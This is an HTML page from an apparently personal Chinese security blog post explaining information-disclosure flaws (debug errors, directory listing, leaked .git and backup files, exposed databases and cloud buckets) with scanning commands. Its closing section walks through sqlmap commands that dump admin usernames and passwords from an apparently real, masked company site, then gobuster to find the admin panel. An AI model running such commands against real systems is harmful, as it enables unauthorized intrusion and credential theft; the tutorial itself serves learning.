@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="ch" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>信息泄露漏洞学习1 | cyan5s's blog</title><meta name="author" content="cyan5s"><meta name="copyright" content="cyan5s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="因设计、配置或代码缺陷，无意中向用户（尤其是未授权用户）暴露了敏感信息 原理一、服务器与中间件泄露主要由错误的配置或默认行为引起  默认错误页面与调试信息  场景： 应用程序在生产环境中启用了调试模式。当出现错误（如数据库连接失败、代码语法错误）时，服务器不是向用户返回一个友好的错误页面，而是返回包含*堆栈跟踪（Stack Trace） 的详细错误信息。* 泄露内容： 绝对服务器路径、数据库连接字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信息泄露漏洞学习1">
+<meta property="og:url" content="http://cyan5s.github.io/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/index.html">
+<meta property="og:site_name" content="cyan5s&#39;s blog">
+<meta property="og:description" content="因设计、配置或代码缺陷，无意中向用户（尤其是未授权用户）暴露了敏感信息 原理一、服务器与中间件泄露主要由错误的配置或默认行为引起  默认错误页面与调试信息  场景： 应用程序在生产环境中启用了调试模式。当出现错误（如数据库连接失败、代码语法错误）时，服务器不是向用户返回一个友好的错误页面，而是返回包含*堆栈跟踪（Stack Trace） 的详细错误信息。* 泄露内容： 绝对服务器路径、数据库连接字">
+<meta property="og:locale">
+<meta property="og:image" content="http://cyan5s.github.io/img/cyan5s.jpg">
+<meta property="article:published_time" content="2025-10-16T12:30:21.000Z">
+<meta property="article:modified_time" content="2025-11-22T05:23:52.039Z">
+<meta property="article:author" content="cyan5s">
+<meta property="article:tag" content="信息泄露">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cyan5s.github.io/img/cyan5s.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "信息泄露漏洞学习1",
+  "url": "http://cyan5s.github.io/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/",
+  "image": "http://cyan5s.github.io/img/cyan5s.jpg",
+  "datePublished": "2025-10-16T12:30:21.000Z",
+  "dateModified": "2025-11-22T05:23:52.039Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cyan5s",
+      "url": "http://cyan5s.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://cyan5s.github.io/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '信息泄露漏洞学习1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">cyan5s's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">信息泄露漏洞学习1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">信息泄露漏洞学习1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-16T12:30:21.000Z" title="Created 2025-10-16 20:30:21">2025-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-22T05:23:52.039Z" title="Updated 2025-11-22 13:23:52">2025-11-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>因设计、配置或代码缺陷，无意中向用户（尤其是未授权用户）暴露了敏感信息</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="一、服务器与中间件泄露"><a href="#一、服务器与中间件泄露" class="headerlink" title="一、服务器与中间件泄露"></a>一、服务器与中间件泄露</h2><p>主要由错误的配置或默认行为引起</p>
+<ol>
+<li><h3 id="默认错误页面与调试信息"><a href="#默认错误页面与调试信息" class="headerlink" title="默认错误页面与调试信息"></a><strong>默认错误页面与调试信息</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 应用程序在生产环境中启用了调试模式。<em>当出现错误（如数据库连接失败、代码语法错误）时，服务器不是向用户返回一个友好的错误页面，而是返回包含*<em>堆栈跟踪（Stack Trace）</em></em> 的详细错误信息。*</li>
+<li><strong>泄露内容</strong>： <strong>绝对服务器路径</strong>、<strong>数据库连接字符串</strong>、<strong>SQL查询语句片段</strong>、<strong>代码片段</strong>、<strong>服务器使用的框架和库的版本</strong>。</li>
+<li><strong>案例</strong>： 访问 <code>https://example.com/user.php?id=abc</code>（传入一个非数字参数），页面返回 <code>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/html/app/database.php on line 55</code>。这直接泄露了路径和数据库类型。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>触发错误</strong>： 在URL参数、表单字段、HTTP头（如 <code>Cookie</code>, <code>User-Agent</code>）中提交异常数据：特殊字符：<code>&#39; &quot; ; -- /*</code>（触发SQL或XSS错误）超长字符串：<code>AAAAAAAA...[数万个A]...AAA</code>（触发缓冲区溢出或处理异常）错误数据类型：例如向需要数字的参数 <code>id=1</code>提交 <code>id=abc</code>。</li>
+<li><strong>工具辅助</strong>： 使用Burp Suite的 <strong>Active Scan</strong> 功能或 <strong>Nuclei</strong> 模板</li>
+</ul>
+</li>
+<li><h3 id="目录列表（Directory-Listing）"><a href="#目录列表（Directory-Listing）" class="headerlink" title="目录列表（Directory Listing）"></a><strong>目录列表（Directory Listing）</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： Web服务器（如Apache、Nginx、IIS）的某个目录下没有默认首页文件（如 <code>index.html</code>, <code>index.php</code>），且服务器配置为允许显示目录内容。</li>
+<li><strong>泄露内容</strong>： 该目录下的所有<strong>文件名和子目录结构</strong>。攻击者可以像在文件管理器中一样浏览，直接发现备份文件、配置文件、上传的敏感文件等。</li>
+<li><strong>案例</strong>： 访问 <code>https://example.com/assets/</code>，浏览器直接显示一个包含 <code>backup_20231027.zip</code>, <code>config.ini.bak</code>, <code>uploads/</code>的列表。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>目录枚举</strong>： 使用目录爆破工具，并对所有发现的目录进行访问，观察响应。<ul>
+<li><strong>工具</strong>： <code>dirsearch</code>, <code>gobuster</code>, <code>ffuf</code>。</li>
+<li><strong>命令示例</strong>： <code>dirsearch -u https://target.com -e php,html,zip,bak</code></li>
+</ul>
+</li>
+<li><strong>常见路径</strong>： 手动尝试访问常见路径，如 <code>/uploads</code>, <code>/assets</code>, <code>/images</code>, <code>/admin</code>, <code>/backup</code>, <code>/tmp</code></li>
+</ul>
+</li>
+<li><h3 id="冗余与备份文件"><a href="#冗余与备份文件" class="headerlink" title="冗余与备份文件"></a><strong>冗余与备份文件</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 开发人员在线上环境遗留了用于开发、测试或备份的文件。</li>
+<li><strong>泄露内容</strong>：<ul>
+<li><strong>备份文件</strong>： <code>.bak</code>, <code>.old</code>, <code>.txt</code>, <code>.zip</code>, <code>.tar.gz</code>等后缀的文件可能包含源代码或数据库备份。</li>
+<li><strong>版本控制文件</strong>： <strong><code>.git</code>目录</strong>、<strong><code>.svn</code>目录</strong>、<strong><code>.DS_Store</code></strong>（macOS系统文件）。如果能被直接访问，攻击者可以利用工具（如 <code>githacker</code>）<strong>下载完整的源代码仓库</strong>。</li>
+<li><strong>编辑器临时文件</strong>： <code>.swp</code>(Vim), <code>.swo</code>, <code>.~</code>(某些IDE) 文件可能包含正在编辑的未保存内容。</li>
+</ul>
+</li>
+<li><strong>案例</strong>： 著名的 <code>.git</code>泄露事件屡见不鲜，攻击者下载源码后分析，发现了数据库密码硬编码在配置文件中。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>文件枚举</strong>： 使用字典对目标进行文件爆破，字典应包含备份文件常见后缀。<ul>
+<li><strong>常用后缀</strong>： <code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>.swo</code>, <code>.tar.gz</code>, <code>.zip</code>, <code>.7z</code>, <code>.rar</code>, <code>.txt</code>, <code>.src</code>, <code>.dist</code>.</li>
+<li><strong>特殊文件</strong>： <code>/.git/HEAD</code>, <code>/.DS_Store</code>, <code>/.env</code>, <code>/web.config</code>, <code>/phpinfo.php</code>。</li>
+</ul>
+</li>
+<li><strong>工具</strong>： 同上（<code>dirsearch</code>, <code>gobuster</code>），但使用专门的文件字典。</li>
+<li><strong>Git泄露利用</strong>： 发现 <code>/.git/</code>目录后，使用 <strong><code>GitHacker</code></strong> 或 <strong><code>dvcs-ripper</code></strong> 工具尝试下载完整源码库。</li>
+</ul>
+<p><strong>验证</strong>： 访问文件URL，返回200状态码并可下载或查看文件内容</p>
+</li>
+<li><h3 id="HTTP响应头信息"><a href="#HTTP响应头信息" class="headerlink" title="HTTP响应头信息"></a><strong>HTTP响应头信息</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： Web服务器、应用程序框架或编程语言默认会在HTTP响应头中添加标识自身的字段。</li>
+<li><strong>泄露内容</strong>： <strong>服务器软件和精确版本</strong>（<code>Server: nginx/1.18.0</code>）、<strong>后端编程语言和版本</strong>（<code>X-Powered-By: PHP/7.4.33</code>）、<strong>使用的框架</strong>（<code>X-Generator: Django 3.2</code>）。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>手动分析</strong>： 使用浏览器开发者工具（F12）的“网络(Network)”面板，或使用 <code>curl</code>命令，检查所有HTTP请求的响应头。<ul>
+<li><strong>命令示例</strong>： <code>curl -I https://target.com</code>（<code>-I</code>选项只获取头部）</li>
+</ul>
+</li>
+<li><strong>工具辅助</strong>： Burp Suite 的 <strong>Proxy</strong> 或 <strong>Repeater</strong> 模块可以方便地查看和对比所有响应头。</li>
+</ul>
+<p><strong>关键字段</strong>： 检查 <code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>, <code>X-Generator</code>, <code>X-Debug-Token</code>等字段的值。</p>
+</li>
+</ol>
+<hr>
+<h2 id="二、应用程序逻辑泄露"><a href="#二、应用程序逻辑泄露" class="headerlink" title="二、应用程序逻辑泄露"></a>二、应用程序逻辑泄露</h2><p>应用程序自身的设计和代码逻辑缺陷。</p>
+<ol>
+<li><h3 id="用户输入导致的错误泄露"><a href="#用户输入导致的错误泄露" class="headerlink" title="用户输入导致的错误泄露"></a><strong>用户输入导致的错误泄露</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 用户通过参数（如URL参数、表单字段、HTTP头）提交了应用程序未预料到的数据，导致程序异常，并将错误细节返回。</li>
+<li><strong>泄露内容</strong>： 同“调试信息”，但由用户输入触发。</li>
+<li><strong>案例</strong>： 在搜索框输入一个单引号 <code>&#39;</code>，页面返回SQL语法错误，暴露了数据库类型和部分表结构。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>模糊测试（Fuzzing）</strong>： 对所有用户输入点进行系统性的异常输入测试。<ul>
+<li><strong>输入点</strong>： GET&#x2F;POST参数、Cookie、JSON请求体、XML文件上传、HTTP头。</li>
+<li><strong>工具</strong>： Burp Suite的 <strong>Intruder</strong> 或 <strong>Scanner</strong> 模块是首选。也可以使用 <code>ffuf</code>。</li>
+</ul>
+</li>
+<li><strong>步骤</strong>： 提交测试Payload -&gt; 捕获响应 -&gt; 筛选出与其他响应<strong>不同</strong>的报文（不同状态码、不同长度、包含错误关键词）。</li>
+</ul>
+<p><strong>验证</strong>： 响应中包含系统抛出的详细错误信息，而非统一的错误页面</p>
+</li>
+<li><h3 id="用户与数据枚举"><a href="#用户与数据枚举" class="headerlink" title="用户与数据枚举"></a><strong>用户与数据枚举</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 应用程序在不同操作（如登录、注册、密码重置）返回的差异信息，允许攻击者判断某些信息是否存在。</li>
+<li><strong>泄露内容</strong>： <strong>有效的用户名</strong>、<strong>邮箱地址</strong>、<strong>手机号</strong>。</li>
+<li><strong>案例</strong>：<ul>
+<li><strong>登录功能</strong>： 输入正确用户名错误密码提示“密码错误”，输入错误用户名则提示“用户不存在”。</li>
+<li><strong>注册功能</strong>： 输入已存在的邮箱提示“该邮箱已注册”。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>对比分析</strong>： 对登录、注册、密码重置、用户名检查等功能进行测试。<ul>
+<li><em><strong>测试用例</strong>：</em><ul>
+<li><em>登录：使用有效用户+错误密码 vs 无效用户+任意密码。</em></li>
+<li><em>注册：使用已存在的邮箱 vs 未存在的邮箱。</em></li>
+<li><em>密码重置：输入已知的用户名&#x2F;邮箱 vs 未知的。</em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>对比内容</strong>：<ul>
+<li><strong>HTTP状态码</strong>： 是否不同（如200 vs 404）。</li>
+<li><strong>响应体内容</strong>： 错误信息是否不同（如“密码错误” vs “用户不存在”）。</li>
+<li><strong>响应时间</strong>： 检查用户是否存在是否导致响应时间有显著差异（时间盲注）。</li>
+<li><strong>响应长度</strong>： 两个响应的字节长度是否不同。</li>
+</ul>
+</li>
+<li><strong>工具</strong>： Burp Suite的 <strong>Comparer</strong> 工具是进行差异对比的神器。</li>
+</ul>
+<p><strong>验证</strong>： 通过差异可以可靠地推断出某个数据（如用户名）是否存在。</p>
+</li>
+<li><h3 id="API响应过度"><a href="#API响应过度" class="headerlink" title="API响应过度"></a><strong>API响应过度</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： API接口在响应请求时，返回了远多于前端所需的数据对象，通常是数据库记录的完整映射。</li>
+<li><strong>泄露内容</strong>： <strong>用户密码哈希</strong>、<strong>内部用户ID</strong>、<strong>其他用户的隐私数据</strong>、<strong>系统内部信息</strong>。</li>
+<li><strong>案例</strong>： 调用 <code>GET /api/users/me</code>获取当前用户信息，API却返回了 <code>{id: 123, name: &quot;alice&quot;, email: &quot;alice@example.com&quot;, password_hash: &quot;...&quot;, is_admin: true, ...}</code>，包含了敏感字段。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>权限切换测试</strong>： 使用不同权限的用户（尤其是低权限用户）访问同一个API端点，观察返回的数据结构。<ul>
+<li><strong>步骤</strong>：<ul>
+<li>用普通用户A登录，访问 <code>GET /api/users/123</code>。</li>
+<li>用普通用户B登录，访问 <code>GET /api/users/123</code>。</li>
+<li><em>用管理员登录，访问同一个端点。</em></li>
+<li><strong>对比</strong>三个响应，看低权限用户是否能获取到本不应看到的数据（如他人的邮箱、私人信息）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>工具</strong>： Burp Suite的 <strong>Repeater</strong> 模块，配合不同身份认证的Cookie或Token，方便地重放和对比请求。</li>
+</ul>
+<p><strong>验证</strong>： 响应中包含了当前用户权限范围之外的敏感数据字段。</p>
+</li>
+</ol>
+<hr>
+<h2 id="三、云与第三方服务配置错误"><a href="#三、云与第三方服务配置错误" class="headerlink" title="三、云与第三方服务配置错误"></a>三、云与第三方服务配置错误</h2><p>现代应用依赖大量外部服务，配置不当会导致严重泄露。</p>
+<ol>
+<li><h3 id="云存储桶公开访问"><a href="#云存储桶公开访问" class="headerlink" title="云存储桶公开访问"></a><strong>云存储桶公开访问</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 将阿里云OSS、AWS S3、Google Cloud Storage等云存储服务设置为“公开可读”（Public Read），导致任何知道链接的人都可以下载文件。</li>
+<li><strong>泄露内容</strong>： <strong>用户上传的私人文件</strong>、<strong>应用程序源码</strong>、<strong>配置文件</strong>、<strong>数据库备份</strong>。</li>
+<li><strong>案例</strong>： 数亿条用户数据因S3桶配置错误而泄露的新闻屡见报端。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>被动侦查</strong>：<ul>
+<li><strong>搜索引擎语法</strong>： 在Google等搜索引擎中搜索 <code>site:s3.amazonaws.com &lt;company_name&gt;</code>或 <code>site:oss-cn-hangzhou.aliyuncs.com &lt;company_name&gt;</code>。</li>
+</ul>
+</li>
+<li><strong>主动扫描</strong>：<ul>
+<li><strong>工具扫描</strong>： 使用专门针对云存储桶的工具，它们通过字典来猜测桶名并检查其权限。<ul>
+<li><strong>AWS S3</strong>： <strong><code>s3scanner</code></strong>, <strong><code>bucket-stream</code></strong>, <code>awscli</code>（<code>aws s3 ls s3://bucket-name/</code>）</li>
+<li><strong>阿里云 OSS</strong>： <strong><code>ossutils</code></strong>。</li>
+</ul>
+</li>
+<li><strong>步骤</strong>： 工具通常会生成可能的桶名（如 <code>company-prod</code>, <code>company-assets</code>, <code>company-backup</code>）并尝试列出其内容。</li>
+</ul>
+</li>
+</ul>
+<p><strong>验证</strong>： 能够匿名地列出存储桶内的文件列表，或直接通过URL下载到文件。</p>
+</li>
+<li><h3 id="公开的监控与调试端口"><a href="#公开的监控与调试端口" class="headerlink" title="公开的监控与调试端口"></a><strong>公开的监控与调试端口</strong></h3><blockquote>
+<ul>
+<li><strong>场景</strong>： 将用于系统监控、调试的服务（如Redis, Memcached, MongoDB, Elasticsearch）暴露在公网，且未设置认证。</li>
+<li><strong>泄露内容</strong>： <strong>整个数据库的内容</strong>、<strong>服务器性能指标</strong>、<strong>内部网络信息</strong>。</li>
+</ul>
+</blockquote>
+<p><strong>查找方法</strong>：</p>
+<ul>
+<li><strong>端口扫描</strong>： 使用 <strong><code>nmap</code></strong> 或 <strong><code>masscan</code></strong> 对目标IP段进行常用端口扫描。<ul>
+<li><strong>关键端口</strong>： <code>6379</code>(Redis), <code>27017</code>(MongoDB), <code>9200</code>(Elasticsearch), <code>11211</code>(Memcached), <code>5601</code>(Kibana)。</li>
+<li><strong>命令示例</strong>： <code>nmap -p 6379,27017,9200 -sV target-ip-range</code></li>
+</ul>
+</li>
+<li><strong>空间测绘引擎</strong>： 使用 <strong>Shodan</strong>, <strong>Censys</strong>, <strong>FoFa</strong> 直接搜索开放了这些服务的IP。<ul>
+<li><strong>搜索语法</strong>：<ul>
+<li><code>port:6379 redis</code> </li>
+<li><code>product:mongodb</code> </li>
+<li><code>&quot;elasticsearch&quot; &quot;server: Elasticsearch&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>匿名连接测试</strong>： 扫描发现端口开放后，使用客户端工具尝试匿名连接。<strong>Redis示例</strong>： <code>redis-cli -h &lt;target-ip&gt;</code>连接后尝试执行 <code>INFO</code>命令。</li>
+</ul>
+<p><strong>验证</strong>： 无需任何认证即可连接到服务并执行查询或管理命令。</p>
+</li>
+</ol>
+<p>总结一下：</p>
+<ul>
+<li><p>大范围，进行适当的漏扫</p>
+</li>
+<li><p>范围小，手动注入时：</p>
+<ul>
+<li>明白每种漏洞可能存在的位置，利用该漏洞可能存在的方法进行测试（输入回显）</li>
+</ul>
+</li>
+</ul>
+<p>之后根据例子学习每个漏洞（【0】是SQL注入 目录扫描 弱口令）</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>某公司存在SQL注入，参数为id</p>
+<p><img src="https://free.picui.cn/free/2025/11/22/692146e2b7dd8.png" alt="1763788561925.png"></p>
+<p>获取数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://***/index.php?c=news&amp;a=show&amp;id=164&quot; -p id --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<p>发现数据库名 <code>q***5_db</code></p>
+<p>获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://***/index.php?c=news&amp;a=show&amp;id=164&quot; -p id -D &quot;q***5_db&quot; --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://free.picui.cn/free/2025/11/22/6921478f4d6ff.png" alt="1763788733357.png"></p>
+<p>感觉后面的没用了，不扫了</p>
+<p>获取admin和adimin_login的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://***/index.php?c=news&amp;a=show&amp;id=164&quot; -p id -D q***5_db -T admin --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://free.picui.cn/free/2025/11/22/69214810ba4ad.png" alt="1763788863462.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://***/index.php?c=news&amp;a=show&amp;id=164&quot; -p id -D q***5_db -T admin -C username,password --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://free.picui.cn/free/2025/11/22/6921489c0fdc1.png" alt="1763789003858.png"></p>
+<p>pswd需要解密</p>
+<p>目录扫描gobuster</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\gobuster dir -u &quot;http://***.com&quot; -w .\dir.txt</span><br></pre></td></tr></table></figure>
+
+<p>找到后台&#x2F;admin进入</p>
+<p>经测试，后台有上传文件的按钮，但文件无法写入系统</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://cyan5s.github.io">cyan5s</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://cyan5s.github.io/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/">http://cyan5s.github.io/2025/10/16/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">信息泄露</a></div><div class="post-share"><div class="social-share" data-image="/img/cyan5s.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/21/%E4%BD%9C%E5%93%81%E9%9B%86/" title="作品集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">作品集</div></div><div class="info-2"><div class="info-item-1"> </div></div></div></a><a class="pagination-related" href="/2025/10/16/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">信息搜集</div></div><div class="info-2"><div class="info-item-1">X1师傅已经讲得很清楚了：信息搜集 | X1ly?S 工具使用FOFA{被动} https://fofa.info/  常用字段   字段名 说明 示例 用途    ip 根据 IP 地址搜索 ip=&quot;123.123.123.123&quot; 查找指定 IP 的资产   domain 根据域名搜索 domain=&quot;fofa.info&quot; 查找指定根域名的所有子域名资产   host 搜索包含该字符串的域名或 URL host=&quot;.gov.cn&quot; 搜索所有包含 .gov.cn的域名   title 根据网页标题搜索 title=&quot;后台管理&quot; 搜索标题为“后台管理”的页面   header 根据 HTTP 响应头搜索 header=&quot;thinkphp&quot; 搜索响应头中包含 “thinkphp” 的服务   server 根据服务器信息搜索 server==&quot;nginx&quot; 搜索使用 nginx 作为服务器的资产   cert 根据证书内容搜索 cert=&quot;google....</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/cyan5s.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cyan5s</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div 